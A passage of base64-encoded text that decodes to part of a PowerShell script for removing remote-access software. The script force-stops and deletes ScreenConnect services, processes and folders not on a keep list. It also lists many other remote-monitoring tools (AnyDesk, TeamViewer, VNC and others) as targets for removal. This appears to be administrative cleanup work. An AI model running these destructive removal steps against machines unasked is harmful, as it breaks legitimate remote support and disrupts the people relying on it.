Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1Nj
cmVlbkNvbm5lY3QgQ2xpZW50KicgfSkpIHsKICAgICAgICBpZiAoSXMtS2VlcGVyICRzdmMuTmFt
ZSkgeyBjb250aW51ZSB9CiAgICAgICAgJiBzYy5leGUgc3RvcCAiJCgkc3ZjLk5hbWUpIiAyPiYx
IHwgT3V0LU51bGwKICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDYwMAogICAgICAg
ICYgc2MuZXhlIGRlbGV0ZSAiJCgkc3ZjLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAk
bi5zdmMrKzsgTG9nICJzdmNfZGVsZXRlZCAkKCRzdmMuTmFtZSkiCiAgICB9CgogICAgIyAzLiBm
b3JlaWduIFNDIHByb2Nlc3NlcyDigJQgT05MWSBpZiBwYXRoL2NtZGxpbmUgZW1iZWRzIGEgTk9O
LWtlZXBlciBGUC4KICAgICMgTzQxOiBudWxsIEV4ZWN1dGFibGVQYXRoIHVzZWQgdG8ga2lsbCBH
cnl4YSBDbGllbnRTZXJ2aWNlIGV2ZXJ5IHRpY2sg4oaSIHJlaW5zdGFsbCBsb29wLgogICAgR2V0
LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25u
ZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgewog
ICAgICAgICRleGUgPSBbc3RyaW5nXSRfLkV4ZWN1dGFibGVQYXRoCiAgICAgICAgJGNtZCA9IFtz
dHJpbmddJF8uQ29tbWFuZExpbmUKICAgICAgICAkYmxvYiA9ICIkZXhlICRjbWQiCiAgICAgICAg
aWYgKElzLUtlZXBlciAkYmxvYikgeyByZXR1cm4gfQogICAgICAgIGlmICgkYmxvYiAtbm90bWF0
Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsKICAgICAgICAgICAgTG9nICJwcm9jX3NraXBf
bm9fZnAgcGlkPSQoJF8uUHJvY2Vzc0lkKSBuYW1lPSQoJF8uTmFtZSkiCiAgICAgICAgICAgIHJl
dHVybgogICAgICAgIH0KICAgICAgICAkZnAgPSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkKICAgICAg
ICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQogICAgICAgIFN0b3AtUHJvY2VzcyAtSWQg
JF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAg
ICRuLnByb2MrKzsgTG9nICJwcm9jX2tpbGxlZCBwaWQ9JCgkXy5Qcm9jZXNzSWQpIGZwPSRmcCBl
eGU9JGV4ZSIKICAgIH0KCiAgICAjIDQuIGZvcmVpZ24gU0MgaW5zdGFsbCBkaXJzIChQRiArIFBG
ODYpCiAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCRlbnY6UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX0pKSB7CiAgICAgICAgaWYgKC1ub3QgJGJhc2UgLW9yIC1ub3QgKFRlc3Qt
UGF0aCAkYmFzZSkpIHsgY29udGludWUgfQogICAgICAgIEdldC1DaGlsZEl0ZW0gLUxpdGVyYWxQ
YXRoICRiYXNlIC1EaXJlY3RvcnkgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
IHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVj
dConIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkZCA9ICRfLkZ1bGxOYW1l
CiAgICAgICAgICAgICAgICBpZiAoSXMtS2VlcGVyICRkKSB7IHJldHVybiB9CiAgICAgICAgICAg
ICAgICBpZiAoRm9yY2UtUmVtb3ZlRGlyICRkKSB7ICRuLmRpcisrOyBMb2cgImRpcl9yZW1vdmVk
ICRkIiB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgImRpcl9SRU1PVkVf
RkFJTEVEICRkIiB9CiAgICAgICAgICAgIH0KICAgIH0KCiAgICAjIDUuIGRpc2FsbG93ZWQgUk1N
IC8gcmVtb3RlLWFjY2VzcyB0b29scyAobWFya2V0IGNvdmVyYWdlIDIwMjYpLgogICAgIyBLRUVQ
IGZvcmV2ZXI6IERhdHRvL0NlbnRyYVN0YWdlICsgU2NyZWVuQ29ubmVjdCBrZWVwIEZQcyAoaGFu
ZGxlZCBhYm92ZSkuCiAgICAjIE5FVkVSIHB1dCBEYXR0by9DZW50cmFTdGFnZS9DYWdTZXJ2aWNl
IGluIHRoaXMgbGlzdC4KICAgIGZ1bmN0aW9uIElzLURhdHRvS2VlcGVyKFtzdHJpbmddJHMpIHsK
ICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0KICAgICAgICByZXR1cm4gW2Jv
b2xdKCRzIC1tYXRjaCAnKD9pKURhdHRvfENlbnRyYVN0YWdlfENhZ1NlcnZpY2V8QXV0b3Rhc2tF
bmRwb2ludCcpCiAgICB9CiAgICAkcm1tID0gQCgKICAgICAgICBAeyBUYWc9J0FueURlc2snOyAg
ICAgIFN2Yz1AKCdBbnlEZXNrJyk7IFByb2M9QCgnQW55RGVzaycpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXEFueURlc2siLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW55RGVzayIsIiRl
bnY6UHJvZ3JhbURhdGFcQW55RGVzayIpOyBQcm9kPUAoJ0FueURlc2sqJykgfQogICAgICAgIEB7
IFRhZz0nVGVhbVZpZXdlcic7ICAgU3ZjPUAoJ1RlYW1WaWV3ZXIqJyk7IFByb2M9QCgnVGVhbVZp
ZXdlcionLCd0dl93MzIqJywndHZfeDY0KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRl
YW1WaWV3ZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGVhbVZpZXdlciIpOyBQcm9kPUAo
J1RlYW1WaWV3ZXIqJykgfQogICAgICAgIEB7IFRhZz0nU3BsYXNodG9wJzsgICAgU3ZjPUAoJ1Nw
bGFzaHRvcConLCdTUlNlcnZpY2UnLCdTU1VTZXJ2aWNlJyk7IFByb2M9QCgnU3BsYXNodG9wKics
J3N0cndpbmNsdConLCdTUk1hbmFnZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3Bs
YXNodG9wIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNwbGFzaHRvcCIpOyBQcm9kPUAoJ1Nw
bGFzaHRvcConKSB9CiAgICAgICAgQHsgVGFnPSdMb2dNZUluJzsgICAgICBTdmM9QCgnTG9nTWVJ
bicsJ0xNSUd1YXJkaWFuU3ZjJywnTE1JaWduaXRpb24nKTsgUHJvYz1AKCdMb2dNZUluKicsJ0xN
SUd1YXJkaWFuKicsJ1JhU2VydmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExvZ01l
SW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTG9nTWVJbiIpOyBQcm9kPUAoJ0xvZ01lSW4q
JykgfQogICAgICAgIEB7IFRhZz0nR29Ubyc7ICAgICAgICAgU3ZjPUAoJ0dvVG9NeVBDKicsJ0dv
VG9Bc3Npc3QqJywnR29Ub1Jlc29sdmUqJyk7IFByb2M9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lz
dConLCdnMm0qJywnR29Ub1Jlc29sdmUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR29U
b015UEMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR29Ub015UEMiKTsgUHJvZD1AKCdHb1Rv
TXlQQyonLCdHb1RvQXNzaXN0KicsJ0dvVG8gUmVzb2x2ZSonLCdHb1RvTWVldGluZyonLCdHb1Rv
IENvbm5lY3QqJykgfQogICAgICAgIEB7IFRhZz0nUnVzdERlc2snOyAgICAgU3ZjPUAoJ1J1c3RE
ZXNrJywncnVzdGRlc2sqJyk7IFByb2M9QCgncnVzdGRlc2sqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcUnVzdERlc2siLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUnVzdERlc2siKTsg
UHJvZD1AKCdSdXN0RGVzayonKSB9CiAgICAgICAgQHsgVGFnPSdTdXByZW1vJzsgICAgICBTdmM9
QCgnU3VwcmVtbyonKTsgUHJvYz1AKCdTdXByZW1vKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXFN1cHJlbW8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3VwcmVtbyIpOyBQcm9kPUAo
J1N1cHJlbW8qJykgfQogICAgICAgIEB7IFRhZz0nRFdTZXJ2aWNlJzsgICAgU3ZjPUAoJ0RXQWdl
bnQnLCdkd2FnZW50KicpOyBQcm9jPUAoJ2R3YWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFt
RmlsZXNcRFdBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxEV0FnZW50IiwiJGVudjpQ
cm9ncmFtRGF0YVxEV0FnZW50Iik7IFByb2Q9QCgnRFdBZ2VudConLCdEV1NlcnZpY2UqJykgfQog
ICAgICAgIEB7IFRhZz0nWm9ob0Fzc2lzdCc7ICAgU3ZjPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob01l
ZXRpbmcqJyk7IFByb2M9QCgnWm9ob0Fzc2lzdConLCdab2hvVVJTQionKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xab2hvTWVldGluZyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxab2hv
TWVldGluZyIpOyBQcm9kPUAoJ1pvaG8gQXNzaXN0KicsJ1pvaG9NZWV0aW5nKicpIH0KICAgICAg
ICBAeyBUYWc9J1JlbW90ZVBDJzsgICAgIFN2Yz1AKCdSZW1vdGVQQyonKTsgUHJvYz1AKCdSZW1v
dGVQQyonLCdSUENTdWl0ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZW1vdGVQQyIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZW1vdGVQQyIpOyBQcm9kPUAoJ1JlbW90ZVBDKicp
IH0KICAgICAgICBAeyBUYWc9J0JvbWdhcic7ICAgICAgIFN2Yz1AKCdib21nYXIqJywnQmV5b25k
VHJ1c3QqJyk7IFByb2M9QCgnYm9tZ2FyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEJv
bWdhciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCb21nYXIiLCIkZW52OlByb2dyYW1GaWxl
c1xCZXlvbmRUcnVzdCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCZXlvbmRUcnVzdCIpOyBQ
cm9kPUAoJ0JvbWdhcionLCdCZXlvbmRUcnVzdConKSB9CiAgICAgICAgQHsgVGFnPSdQYXJzZWMn
OyAgICAgICBTdmM9QCgnUGFyc2VjKicpOyBQcm9jPUAoJ3BhcnNlY2QqJywncHNlcnZpY2UqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUGFyc2VjIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XFBhcnNlYyIsIiRlbnY6UHJvZ3JhbURhdGFcUGFyc2VjIik7IFByb2Q9QCgnUGFyc2VjKicp
IH0KICAgICAgICBAeyBUYWc9J0Nocm9tZVJEJzsgICAgIFN2Yz1AKCdjaHJvbW90aW5nKicpOyBQ
cm9jPUAoJ3JlbW90aW5nX2hvc3QqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR29vZ2xl
XENocm9tZSBSZW1vdGUgRGVza3RvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb29nbGVc
Q2hyb21lIFJlbW90ZSBEZXNrdG9wIik7IFByb2Q9QCgnQ2hyb21lIFJlbW90ZSBEZXNrdG9wKicp
IH0KICAgICAgICBAeyBUYWc9J1VsdHJhVk5DJzsgICAgIFN2Yz1AKCd1dm5jKicsJ3dpbnZuYyon
KTsgUHJvYz1AKCd3aW52bmMqJywndXZuYyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xV
bHRyYVZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZOQyIpOyBQcm9kPUAoJ1Vs
dHJhVk5DKicsJ1dpblZOQyonKSB9CiAgICAgICAgQHsgVGFnPSdUaWdodFZOQyc7ICAgICBTdmM9
QCgndHZuc2VydmVyKicpOyBQcm9jPUAoJ3R2bnNlcnZlcionLCd0dm52aWV3ZXIqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcVGlnaHRWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
VGlnaHRWTkMiKTsgUHJvZD1AKCdUaWdodFZOQyonKSB9CiAgICAgICAgQHsgVGFnPSdSZWFsVk5D
JzsgICAgICBTdmM9QCgndm5jc2VydmVyKicpOyBQcm9jPUAoJ3ZuY3NlcnZlcionLCd2bmN2aWV3
ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVhbFZOQyIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxSZWFsVk5DIik7IFByb2Q9QCgnVk5DIFNlcnZlcionLCdSZWFsVk5DKicpIH0K
ICAgICAgICBAeyBUYWc9J0RhbWVXYXJlJzsgICAgIFN2Yz1AKCdEYW1lV2FyZSonKTsgUHJvYz1A
KCdEV1JDUyonLCdEV1JDQyonLCdEYW1lV2FyZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xTb2xhcldpbmRzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNvbGFyV2luZHMiLCIkZW52
OlByb2dyYW1GaWxlc1xEYW1lV2FyZSBSZW1vdGUgU3VwcG9ydCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxEYW1lV2FyZSBSZW1vdGUgU3VwcG9ydCIpOyBQcm9kPUAoJ0RhbWVXYXJlKicpIH0K
ICAgICAgICBAeyBUYWc9J05ldFN1cHBvcnQnOyAgIFN2Yz1AKCdOZXRTdXBwb3J0KicpOyBQcm9j
PUAoJ2NsaWVudDMyKicsJ3BjaWN0bConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOZXRT
dXBwb3J0IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5ldFN1cHBvcnQiKTsgUHJvZD1AKCdO
ZXRTdXBwb3J0KicpIH0KICAgICAgICBAeyBUYWc9J1NpbXBsZUhlbHAnOyAgIFN2Yz1AKCdTaW1w
bGVIZWxwKicpOyBQcm9jPUAoJ1NpbXBsZVNlcnZpY2UqJywnc2ltcGxlc2VydmljZSonKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xTaW1wbGVIZWxwIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XFNpbXBsZUhlbHAiKTsgUHJvZD1AKCdTaW1wbGVIZWxwKicpIH0KICAgICAgICBAeyBUYWc9
J0dldFNjcmVlbic7ICAgIFN2Yz1AKCdHZXRTY3JlZW4qJyk7IFByb2M9QCgnR2V0U2NyZWVuKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdldFNjcmVlbiIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxHZXRTY3JlZW4iKTsgUHJvZD1AKCdHZXRTY3JlZW4qJykgfQogICAgICAgIEB7IFRh
Zz0nSXBlcml1cyc7ICAgICAgU3ZjPUAoJ0lwZXJpdXMqJyk7IFByb2M9QCgnSXBlcml1c1JlbW90
ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xJcGVyaXVzIFJlbW90ZSIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxJcGVyaXVzIFJlbW90ZSIpOyBQcm9kPUAoJ0lwZXJpdXMqJykgfQog
ICAgICAgIEB7IFRhZz0nSVNMT25saW5lJzsgICBTdmM9QCgnSVNMbGlnaHQqJyk7IFByb2M9QCgn
SVNMbGlnaHQqJywnSVNMQWx3YXlzT24qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSVNM
IE9ubGluZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxJU0wgT25saW5lIik7IFByb2Q9QCgn
SVNMIExpZ2h0KicsJ0lTTCBBbHdheXNPbionKSB9CiAgICAgICAgQHsgVGFnPSdBbW15eSc7ICAg
ICAgICBTdmM9QCgnQW1teXkqJyk7IFByb2M9QCgnQW1teXkqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcQW1teXkiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW1teXkiKTsgUHJvZD1A
KCdBbW15eSonKSB9CiAgICAgICAgQHsgVGFnPSdVbHRyYVZpZXdlcic7ICBTdmM9QCgnVWx0cmFW
aWV3ZXIqJyk7IFByb2M9QCgnVWx0cmFWaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcVWx0cmFWaWV3ZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVWx0cmFWaWV3ZXIiKTsg
UHJvZD1AKCdVbHRyYVZpZXdlcionKSB9CiAgICAgICAgQHsgVGFnPSdBZXJvQWRtaW4nOyAgICBT
dmM9QCgnQWVyb0FkbWluKicpOyBQcm9jPUAoJ0Flcm9BZG1pbionKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xBZXJvQWRtaW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWVyb0FkbWlu
Iik7IFByb2Q9QCgnQWVyb0FkbWluKicpIH0KICAgICAgICBAeyBUYWc9J0xpdGVNYW5hZ2VyJzsg
IFN2Yz1AKCdMaXRlTWFuYWdlcionKTsgUHJvYz1AKCdST01TZXJ2ZXIqJywnUk9NVmlld2VyKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExpdGVNYW5hZ2VyIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XExpdGVNYW5hZ2VyIik7IFByb2Q9QCgnTGl0ZU1hbmFnZXIqJykgfQogICAgICAg
IEB7IFRhZz0nUmFkbWluJzsgICAgICAgU3ZjPUAoJ1JhZG1pbionKTsgUHJvYz1AKCdyc2VydmVy
MyonLCdSYWRtaW4qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmFkbWluIFNlcnZlciAz
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJhZG1pbiBTZXJ2ZXIgMyIpOyBQcm9kPUAoJ1Jh
ZG1pbionKSB9CiAgICAgICAgQHsgVGFnPSdOb01hY2hpbmUnOyAgICBTdmM9QCgnbnhzZXJ2ZXIq
JywnbnhkKicpOyBQcm9jPUAoJ254ZConLCdueHNlcnZlcionLCdueHJ1bm5lcionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xOb01hY2hpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
Tm9NYWNoaW5lIik7IFByb2Q9QCgnTm9NYWNoaW5lKicpIH0KICAgICAgICBAeyBUYWc9J05pbmph
T25lJzsgICAgIFN2Yz1AKCdOaW5qYVJNTUFnZW50JywnbmluamFybW0qJywnTmluamFSTU0qJyk7
IFByb2M9QCgnTmluamFSTU1BZ2VudConLCduaW5qYXJtbSonKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xOaW5qYVJNTUFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphUk1N
QWdlbnQiLCIkZW52OlByb2dyYW1EYXRhXE5pbmphUk1NQWdlbnQiLCIkZW52OlByb2dyYW1GaWxl
c1xOaW5qYU9uZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYU9uZSIpOyBQcm9kPUAo
J05pbmphUk1NKicsJ05pbmphT25lKicpIH0KICAgICAgICBAeyBUYWc9J0F0ZXJhJzsgICAgICAg
IFN2Yz1AKCdBdGVyYUFnZW50Jyk7IFByb2M9QCgnQXRlcmFBZ2VudConKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xBVEVSQSBOZXR3b3JrcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxB
VEVSQSBOZXR3b3JrcyIsIiRlbnY6UHJvZ3JhbURhdGFcQVRFUkEgTmV0d29ya3MiKTsgUHJvZD1A
KCdBdGVyYSonKSB9CiAgICAgICAgQHsgVGFnPSdDb25uZWN0V2lzZSc7ICBTdmM9QCgnTFRTZXJ2
aWNlJywnTFRTdmNNb24nKTsgUHJvYz1AKCdMVFN2YyonLCdMVFRyYXkqJyk7IERpcnM9QCgiJGVu
djp3aW5kaXJcTFRTdmMiLCIkZW52OlByb2dyYW1GaWxlc1xMYWJUZWNoIENsaWVudCIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxMYWJUZWNoIENsaWVudCIpOyBQcm9kPUAoJ0Nvbm5lY3RXaXNl
IEF1dG9tYXRlKicsJ0Nvbm5lY3RXaXNlIFJNTSonLCdMYWJUZWNoKicpIH0KICAgICAgICBAeyBU
YWc9J0thc2V5YSc7ICAgICAgIFN2Yz1AKCdBZ2VudE1vbicsJ0thc2V5YSonLCdLQUFEUyonKTsg
UHJvYz1AKCdBZ2VudE1vbionLCdLYXNleWEqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
S2FzZXlhIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEthc2V5YSIpOyBQcm9kPUAoJ0thc2V5
YSBWU0EqJywnS2FzZXlhIEFnZW50KicpIH0KICAgICAgICBAeyBUYWc9J05hYmxlJzsgICAgICAg
IFN2Yz1AKCdBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOQ2VudHJhbCon
KTsgUHJvYz1AKCdGaWxlU3lzdGVtQWdlbnQqJywnTkNlbnRyYWwqJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTi1h
YmxlIFRlY2hub2xvZ2llcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOLWFibGUgVGVjaG5v
bG9naWVzIiwiJGVudjpQcm9ncmFtRmlsZXNcTVNQQSBGaWxlcyIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxNU1BBIEZpbGVzIik7IFByb2Q9QCgnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCon
LCdOLWFibGUqJywnTi1jZW50cmFsKicsJ04tc2lnaHQqJywnVGFrZSBDb250cm9sKicsJ1NvbGFy
V2luZHMgTVNQKicpIH0KICAgICAgICBAeyBUYWc9J1N5bmNybyc7ICAgICAgIFN2Yz1AKCdTeW5j
cm8qJywnS2FidXRvKicpOyBQcm9jPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcUmVwYWlyVGVjaCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZXBh
aXJUZWNoIiwiJGVudjpQcm9ncmFtRmlsZXNcU3luY3JvIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XFN5bmNybyIsIiRlbnY6UHJvZ3JhbURhdGFcU3luY3JvIik7IFByb2Q9QCgnU3luY3JvKics
J0thYnV0byonLCdSZXBhaXJUZWNoKicpIH0KICAgICAgICBAeyBUYWc9J1B1bHNld2F5JzsgICAg
IFN2Yz1AKCdQdWxzZXdheSonLCdQQyBNb25pdG9yKicpOyBQcm9jPUAoJ1BDTW9uaXRvck1ncion
LCdQQ01vbml0b3JNYW5hZ2VyKicsJ1B1bHNld2F5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXFB1bHNld2F5IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFB1bHNld2F5IiwiJGVudjpQ
cm9ncmFtRmlsZXNcUEMgTW9uaXRvciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQQyBNb25p
dG9yIik7IFByb2Q9QCgnUHVsc2V3YXkqJywnUEMgTW9uaXRvcionKSB9CiAgICAgICAgQHsgVGFn
PSdTdXBlck9wcyc7ICAgICBTdmM9QCgnU3VwZXJPcHMqJyk7IFByb2M9QCgnU3VwZXJPcHMqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwZXJPcHMiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cU3VwZXJPcHMiLCIkZW52OlByb2dyYW1EYXRhXFN1cGVyT3BzIik7IFByb2Q9QCgnU3Vw
ZXJPcHMqJykgfQogICAgICAgIEB7IFRhZz0nTGV2ZWwnOyAgICAgICAgU3ZjPUAoJ0xldmVsKicp
OyBQcm9jPUAoJ2xldmVsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExldmVsIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExldmVsIiwiJGVudjpQcm9ncmFtRGF0YVxMZXZlbCIpOyBQ
cm9kPUAoJ0xldmVsKicpIH0KICAgICAgICBAeyBUYWc9J0FjdGlvbjEnOyAgICAgIFN2Yz1AKCdB
Y3Rpb24xKicpOyBQcm9jPUAoJ0FjdGlvbjEqJywnYWN0aW9uMV9hZ2VudConKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xBY3Rpb24xIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFjdGlv
bjEiLCIkZW52OlByb2dyYW1EYXRhXEFjdGlvbjEiKTsgUHJvZD1AKCdBY3Rpb24xKicpIH0KICAg
ICAgICBAeyBUYWc9J01hbmFnZUVuZ2luZSc7IFN2Yz1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyon
LCdEQ0FnZW50KicpOyBQcm9jPUAoJ01hbmFnZUVuZ2luZSonLCdkY2FnZW50KicsJ1VFTVMqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTWFuYWdlRW5naW5lIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XE1hbmFnZUVuZ2luZSIpOyBQcm9kPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKics
J0Rlc2t0b3AgQ2VudHJhbConLCdFbmRwb2ludCBDZW50cmFsKicsJ1JNTSBDZW50cmFsKicpIH0K
ICAgICAgICBAeyBUYWc9J1RhY3RpY2FsUk1NJzsgIFN2Yz1AKCd0YWN0aWNhbHJtbSonLCdNZXNo
IEFnZW50JywnTWVzaEFnZW50Jyk7IFByb2M9QCgndGFjdGljYWxybW0qJywnbWVzaGFnZW50Kics
J01lc2hBZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUYWN0aWNhbEFnZW50Iiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRhY3RpY2FsQWdlbnQiLCIkZW52OlByb2dyYW1GaWxl
c1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJv
ZD1AKCdUYWN0aWNhbConLCdNZXNoIEFnZW50KicsJ01lc2hDZW50cmFsKicpIH0KICAgICAgICBA
eyBUYWc9J01lc2hDZW50cmFsJzsgIFN2Yz1AKCdNZXNoIEFnZW50JywnTWVzaEFnZW50JywnTWVz
aENlbnRyYWwqJyk7IFByb2M9QCgnTWVzaEFnZW50KicsJ01lc2hDZW50cmFsKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
TWVzaCBBZ2VudCIpOyBQcm9kPUAoJ01lc2gqQWdlbnQqJywnTWVzaENlbnRyYWwqJykgfQogICAg
ICAgIEB7IFRhZz0nQ29udGludXVtJzsgICAgU3ZjPUAoJ1NBQVoqJywnQ29udGludXVtKicpOyBQ
cm9jPUAoJ1NBQVoqJywnQ29udGludXVtKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNB
QVpPRCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTQUFaT0QiLCIkZW52OlByb2dyYW1GaWxl
c1xDb250aW51dW0iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQ29udGludXVtIik7IFByb2Q9
QCgnQ29udGludXVtKicsJ1NBQVoqJykgfQogICAgICAgIEB7IFRhZz0nTmF2ZXJpc2snOyAgICAg
